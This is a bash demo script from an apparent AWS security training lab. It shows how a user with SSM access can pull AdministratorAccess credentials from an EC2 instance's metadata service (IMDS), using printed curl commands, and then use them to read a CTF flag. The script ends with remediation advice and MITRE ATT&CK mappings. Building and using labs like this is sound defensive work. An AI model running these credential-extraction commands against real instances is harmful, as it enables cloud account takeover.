#!/bin/bash

# Demo script for CSPM Misconfiguration: EC2 Instance with Privileged Role
#
# This demonstrates the risk detected by CSPM:
# "EC2 instance should not have a highly privileged IAM role attached to it"
#
# The demo shows that anyone with SSM access to this instance can extract
# administrative credentials from the Instance Metadata Service (IMDS).


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
DEMO_USER="pl-cspm-ec2-001-demo-user"
ADMIN_ROLE="pl-cspm-ec2-001-admin-role"

echo -e "${CYAN}========================================${NC}"
echo -e "${CYAN}CSPM Misconfiguration Demo${NC}"
echo -e "${CYAN}EC2 Instance with Privileged Role${NC}"
echo -e "${CYAN}========================================${NC}\n"

echo -e "${YELLOW}CSPM Check:${NC} aws-ec2-instance-ec2-instance-should-not-have-a-highly-privileged-iam-role-attached-to-it"
echo -e "${YELLOW}Severity:${NC} HIGH"
echo ""
echo -e "${BLUE}This demo shows the risk:${NC}"
echo "Anyone with SSM access to this instance can extract admin credentials."
echo ""

# Step 1: Retrieve credentials and region from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_cspm_misconfig_cspm_ec2_001_instance_with_privileged_role.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract configuration from the grouped output
DEMO_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.demo_user_access_key_id')
DEMO_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.demo_user_secret_access_key')
INSTANCE_ID=$(echo "$MODULE_OUTPUT" | jq -r '.ec2_instance_id')
EC2_ROLE_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.ec2_admin_role_name')
CSPM_CHECK=$(echo "$MODULE_OUTPUT" | jq -r '.cspm_check')
MISCONFIG_SUMMARY=$(echo "$MODULE_OUTPUT" | jq -r '.misconfiguration_summary')

if [ "$DEMO_ACCESS_KEY_ID" == "null" ] || [ -z "$DEMO_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Extract readonly credentials for observation/polling steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

if [ "$INSTANCE_ID" == "null" ] || [ -z "$INSTANCE_ID" ]; then
    echo -e "${RED}Error: Could not extract instance ID from terraform output${NC}"
    echo "The EC2 instance may not be ready yet. Wait a few minutes and try again."
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo -e "${CYAN}Misconfiguration Detected:${NC}"
echo "  $MISCONFIG_SUMMARY"
echo ""
echo "Demo User: $DEMO_USER"
echo "Access Key ID: ${DEMO_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo "Instance ID: $INSTANCE_ID"
echo "Privileged Role: $EC2_ROLE_NAME"
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Credential switching helpers
use_demo_creds() {
    export AWS_ACCESS_KEY_ID="$DEMO_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$DEMO_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source demo permissions library for validation restriction
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../../scripts/lib/demo_permissions.sh"

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"

# [EXPLOIT] Step 2: Configure AWS credentials with demo user (simulating someone with SSM access)
echo -e "${YELLOW}Step 2: Simulating a user with SSM access to this instance${NC}"
use_demo_creds
export AWS_REGION=$AWS_REGION

# Verify demo user identity
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"
echo -e "${GREEN}✓ Authenticated as user with SSM access${NC}\n"

# [EXPLOIT] Step 3: Show the user does NOT have admin permissions
echo -e "${YELLOW}Step 3: Verifying demo user has limited permissions${NC}"
use_demo_creds
echo "Attempting to list IAM users (should fail)..."
show_cmd "Attacker" "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ User unexpectedly has IAM permissions${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Demo user cannot list IAM users${NC}"
fi
echo ""

# [OBSERVATION] Step 4: Check SSM agent status
echo -e "${YELLOW}Step 4: Checking if instance is ready for SSM session${NC}"
use_readonly_creds

MAX_RETRIES=5
RETRY_COUNT=0
SSM_READY=false

while [ $RETRY_COUNT -lt $MAX_RETRIES ]; do
    SSM_STATUS=$(aws ssm describe-instance-information \
        --region $AWS_REGION \
        --filters "Key=InstanceIds,Values=$INSTANCE_ID" \
        --query 'InstanceInformationList[0].PingStatus' \
        --output text 2>/dev/null || echo "")

    if [ "$SSM_STATUS" = "Online" ]; then
        echo -e "${GREEN}✓ SSM agent is online and ready${NC}"
        SSM_READY=true
        break
    else
        RETRY_COUNT=$((RETRY_COUNT + 1))
        if [ $RETRY_COUNT -lt $MAX_RETRIES ]; then
            echo "SSM agent not ready yet (attempt $RETRY_COUNT/$MAX_RETRIES), waiting 10 seconds..."
            sleep 10
        fi
    fi
done

if [ "$SSM_READY" = false ]; then
    echo -e "${RED}Error: SSM agent is not ready on instance $INSTANCE_ID${NC}"
    echo "The instance may still be initializing. Please wait a few minutes and try again."
    exit 1
fi
echo ""

# [EXPLOIT] Step 5: Interactive SSM session
echo -e "${YELLOW}Step 5: Demonstrating the risk - SSM access to privileged instance${NC}"
use_demo_creds
echo -e "${CYAN}========================================${NC}"
echo -e "${CYAN}THE RISK: SSM ACCESS = ADMIN ACCESS${NC}"
echo -e "${CYAN}========================================${NC}"
echo ""
echo "This instance has a role with AdministratorAccess attached."
echo "Anyone who can start an SSM session can extract admin credentials from IMDS."
echo ""
echo -e "${YELLOW}Once connected, run these commands to extract admin credentials:${NC}"
echo ""
echo -e "${GREEN}# Step 1: Get IMDSv2 token${NC}"
echo 'TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null)'
echo ""
echo -e "${GREEN}# Step 2: Get the role name${NC}"
echo 'ROLE_NAME=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null)'
echo 'echo "Role: $ROLE_NAME"'
echo ""
echo -e "${GREEN}# Step 3: Extract admin credentials${NC}"
echo 'curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME 2>/dev/null | jq .'
echo ""
echo -e "${RED}These credentials have AdministratorAccess to your AWS account!${NC}"
echo ""
echo -e "${YELLOW}Type 'exit' to leave the session when done.${NC}"
echo ""
echo -e "${CYAN}========================================${NC}"
echo ""
echo "Press ENTER to start the SSM session..."
read

# Start the interactive session
show_attack_cmd "Attacker" "aws ssm start-session --region $AWS_REGION --target $INSTANCE_ID"
aws ssm start-session \
    --region $AWS_REGION \
    --target $INSTANCE_ID

# After session ends
echo ""
echo -e "${GREEN}✓ SSM session ended${NC}\n"

# [EXPLOIT] Step 6: Retrieve CTF flag using stolen IMDS credentials
# The IMDS credentials belong to the admin role (AdministratorAccess), which grants
# ssm:GetParameter implicitly. Prompt the user to paste the stolen credentials so the
# demo script can call ssm:GetParameter on their behalf.
echo -e "${YELLOW}Step 6: Retrieving CTF flag using stolen admin credentials${NC}"
echo ""
echo -e "${BLUE}Paste the stolen credentials from the IMDS output above.${NC}"
echo -e "${BLUE}Leave blank and press ENTER to skip the flag capture step.${NC}"
echo ""

echo -n "AccessKeyId: "
read STOLEN_ACCESS_KEY
echo -n "SecretAccessKey: "
read STOLEN_SECRET_KEY
echo -n "Token: "
read STOLEN_SESSION_TOKEN

FLAG_PARAM_NAME="/pathfinding-labs/flags/cspm-ec2-001-to-admin"

if [ -n "$STOLEN_ACCESS_KEY" ] && [ -n "$STOLEN_SECRET_KEY" ] && [ -n "$STOLEN_SESSION_TOKEN" ]; then
    export AWS_ACCESS_KEY_ID="$STOLEN_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$STOLEN_SECRET_KEY"
    export AWS_SESSION_TOKEN="$STOLEN_SESSION_TOKEN"
    export AWS_REGION=$AWS_REGION

    echo ""
    echo "Fetching flag from SSM: $FLAG_PARAM_NAME"
    show_attack_cmd "Attacker (admin role via IMDS)" "aws ssm get-parameter --region $AWS_REGION --name \"$FLAG_PARAM_NAME\" --query 'Parameter.Value' --output text"
    CTF_FLAG=$(aws ssm get-parameter \
        --region "$AWS_REGION" \
        --name "$FLAG_PARAM_NAME" \
        --query 'Parameter.Value' \
        --output text 2>/dev/null)

    if [ -n "$CTF_FLAG" ] && [ "$CTF_FLAG" != "None" ]; then
        echo -e "${GREEN}✓ CTF Flag retrieved: $CTF_FLAG${NC}"
    else
        echo -e "${YELLOW}Note: Could not retrieve CTF flag (flag may not be configured or credentials are invalid)${NC}"
    fi

    # Reset to demo user credentials after flag capture
    use_demo_creds
else
    echo -e "${YELLOW}Skipping flag capture - no stolen credentials provided${NC}"
    CTF_FLAG=""
fi
echo ""

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

# Step 7: Risk summary
echo -e "${CYAN}========================================${NC}"
echo -e "${CYAN}CSPM MISCONFIGURATION RISK SUMMARY${NC}"
echo -e "${CYAN}========================================${NC}"
echo ""
echo -e "${RED}FINDING:${NC} $CSPM_CHECK"
echo ""
echo -e "${YELLOW}Attack path completed:${NC}"
echo "  pl-cspm-ec2-001-demo-user"
echo "    --> ssm:StartSession"
echo "  pl-cspm-ec2-001-instance (EC2)"
echo "    --> IMDS credential extraction"
echo "  pl-cspm-ec2-001-admin-role (AdminRole)"
echo "    --> ssm:GetParameter"
echo "  /pathfinding-labs/flags/cspm-ec2-001-to-admin (CTF Flag)"
if [ -n "$CTF_FLAG" ]; then
    echo ""
    echo -e "${GREEN}CTF Flag: $CTF_FLAG${NC}"
fi
echo ""
echo -e "${YELLOW}What this misconfiguration means:${NC}"
echo "  - The EC2 instance has AdministratorAccess via its instance role"
echo "  - ANYONE with access to this instance can extract admin credentials"
echo ""
echo -e "${YELLOW}Access vectors that could exploit this:${NC}"
echo "  - SSM Session Manager access (demonstrated above)"
echo "  - SSH access (if enabled)"
echo "  - Exploitation of vulnerable software on the instance"
echo "  - Compromised applications running on the instance"
echo "  - Supply chain attacks (malicious packages/AMIs)"
echo ""
echo -e "${YELLOW}Recommended remediation:${NC}"
echo "  1. Follow least privilege - only grant permissions the instance needs"
echo "  2. Remove AdministratorAccess from the instance role"
echo "  3. Use specific IAM policies for required operations"
echo "  4. Consider using AWS Secrets Manager for sensitive credentials"
echo "  5. Enforce IMDSv2 to add an extra layer of protection"
echo ""
echo -e "${BLUE}MITRE ATT&CK Techniques:${NC}"
echo "  - T1552.005: Unsecured Credentials: Cloud Instance Metadata API"
echo "  - T1078.004: Valid Accounts: Cloud Accounts"
echo ""
echo -e "${YELLOW}To clean up demo artifacts:${NC} ./cleanup_attack.sh or use the plabs TUI/CLI"
echo ""

# Restore helpful permissions for manual exploration
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
